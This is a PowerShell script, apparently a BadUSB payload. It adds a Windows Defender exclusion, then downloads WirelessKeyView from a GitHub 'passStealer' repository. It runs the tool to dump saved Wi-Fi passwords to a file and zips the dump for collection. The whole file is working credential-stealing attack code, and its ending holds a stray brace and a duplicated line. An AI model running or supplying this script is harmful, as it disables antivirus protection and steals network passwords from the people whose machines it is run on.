#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

# Exclude path from Defender (if necessary)
Add-MpPreference -ExclusionPath $basePath -Force

# Download WirelessKeyView
$wifiTool = "$basePath\WirelessKeyView.exe"
Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true" -OutFile $wifiTool

# Run WirelessKeyView to extract Wi-Fi passwords
$wifiFile = "$dumpFolder\wifi.txt"
Start-Process -FilePath $wifiTool -ArgumentList "/stext $wifiFile" -NoNewWindow -Wait

# Ensure Wi-Fi file is created
while (!(Test-Path $wifiFile)) {
    Start-Sleep -Seconds 1
}

# Compress extracted data
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Ensure ZIP file is created
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# Flash the terminal 5 times
for ($i = 1; $i -le 5; $i++) {
    Write-Host "`e[5mFlashing Terminal...`e[25m"  # ANSI escape codes for blinking effect
    Start-Sleep -Seconds 1
}

    Start-Sleep -Seconds 1
}

